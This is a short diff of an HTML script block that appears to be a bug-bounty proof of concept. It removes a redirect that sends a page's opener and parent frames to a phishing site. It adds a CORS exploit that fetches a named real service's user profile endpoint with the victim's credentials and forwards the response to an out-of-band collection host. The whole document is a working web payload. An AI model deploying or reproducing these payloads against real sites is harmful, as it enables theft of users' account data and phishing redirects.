@@ -1,4 +1,11 @@
 <script>
-if (window.opener) window.opener.parent.location.replace('http://phishing.com');
-if (window.parent != window) window.parent.location.replace('http://phishing.com');
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://web-api.orange.sixt.com/v2/users/me',true); 
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='//caot9iri7gcu1qbmfnvgntcb5m6qzbqyw.oast.live/log?key='+this.responseText; 
+};
 </script>
